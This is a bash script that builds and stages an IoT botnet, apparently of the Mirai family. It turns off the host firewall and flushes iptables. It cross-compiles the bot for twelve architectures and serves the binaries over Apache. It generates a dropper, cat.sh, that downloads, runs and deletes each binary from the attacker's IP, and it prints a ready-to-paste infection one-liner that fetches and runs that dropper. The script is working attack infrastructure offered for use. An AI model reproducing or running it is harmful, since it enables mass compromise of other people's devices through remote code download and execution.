#!/bin/bash
ufw disable
cd bot

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -P FORWARD ACCEPT

service apache2 start
# ARC700 GCC
mkdir /etc/xcompile
cd /etc/xcompile
wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
tar -xf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
echo 'export PATH=/etc/xcompile/arc/bin:$PATH' >> ~/.bashrc
source ~/.bashrc;rm -rf *.tar.gz
cd ~/Botnet
cd bot
# install ubuntu cross compilers (not recommended)
apt install gcc-powerpc64-linux-gnu -y
apt install gcc-mips-linux-gnu -y
apt install gcc-mipsel-linux-gnu -y
apt install gcc-sparc64-linux-gnu -y
apt install gcc-arm-linux-gnueabi -y
apt install gcc-aarch64-linux-gnu -y
apt install gcc-m68k-linux-gnu -y
apt install gcc-i686-linux-gnu -y
apt install gcc-arm-linux-gnueabihf -y
apt install gcc-sh4-linux-gnu -y

powerpc64-linux-gnu-gcc *.c -o powerpc64 -pthread -DARCH_powerpc64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
mips-linux-gnu-gcc *.c -o mips -pthread -DARCH_mips -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
mipsel-linux-gnu-gcc *.c -o mipsel -pthread -DARCH_mipsel -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
sparc64-linux-gnu-gcc *.c -o sparc -pthread -DARCH_sparc -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
arm-linux-gnueabi-gcc *.c -o arm -pthread -DARCH_arm -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
aarch64-linux-gnu-gcc *.c -o aarch64 -pthread -DARCH_aarch64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
m68k-linux-gnu-gcc *.c -o m68k -pthread -DARCH_m68k -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
i686-linux-gnu-gcc *.c -o i686 -pthread -DARCH_i686 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
arm-linux-gnueabihf-gcc *.c -o armhf -pthread -DARCH_armhf -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
x86_64-linux-gnu-gcc *.c -o x86_64 -pthread -DARCH_x86_64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
arc-linux-gcc *.c -o arc -pthread -DARCH_arc -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
sh4-linux-gnu-gcc *.c -o sh4 -pthread -DARCH_sh4 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99

#move binaries to apache2 dir
mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 sh4 arc /var/www/html

cd ..

IP=$(curl -s ifconfig.me)
cat <<EOF >/var/www/html/cat.sh
#!/bin/bash
wget http://$IP/x86_64;
curl http://$IP/x86_64 -o x86_64;
chmod 777 x86_64;
./x86_64;
rm -rf x86_64;
wget http://$IP/aarch64;
curl http://$IP/aarch64 -o aarch64;
chmod 777 aarch64;
./aarch64;
rm -rf aarch64;
wget http://$IP/armhf;
curl http://$IP/armhf -o armhf;
chmod 777 armhf;
./armhf;
rm -rf armhf;
wget http://$IP/arm;
curl http://$IP/arm -o arm;
chmod 777 arm;
./arm;
rm -rf arm;
wget http://$IP/i686;
curl http://$IP/i686 -o i686;
chmod 777 i686;
./i686;
rm -rf i686;
wget http://$IP/m68k;
curl http://$IP/m68k -o m68k;
chmod 777 m68k;
./m68k;
rm -rf m68k;
wget http://$IP/mips;
curl http://$IP/mips -o mips;
chmod 777 mips;
./mips;
rm -rf mips;
wget http://$IP/mipsel;
curl http://$IP/mipsel -o mipsel;
chmod 777 mipsel;
./mipsel;
rm -rf mipsel;
wget http://$IP/powerpc64;
curl http://$IP/powerpc64 -o powerpc64;
chmod 777 powerpc64;
./powerpc64;
rm -rf powerpc64;
wget http://$IP/sparc;
curl http://$IP/sparc -o sparc;
chmod 777 sparc;
./sparc;
rm -rf sparc;
wget http://$IP/sh4;
curl http://$IP/sh4 -o sh4;
chmod 777 sh4;
./sh4;
rm -rf sh4;
wget http://$IP/arc;
curl http://$IP/arc -o arc;
chmod 777 arc;
./arc;
rm -rf arc;
/var/wii 2>/dev/null &
EOF

echo "DONE COMPILING BOT, BINS IN /var/www/html"
echo "THIS COMPILER IS NOT RECOMMENDED"
echo "Your payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://$IP/cat.sh; curl -O http://$IP/cat.sh; chmod 777 cat.sh; sh cat.sh; sh cat1.sh; rm -rf *"
echo "if your port aint default 80 its not my problem do it manually urself thats just too much work for me, if you dont know what this is and just got a fresh vps you can ignore this message"

exit 0
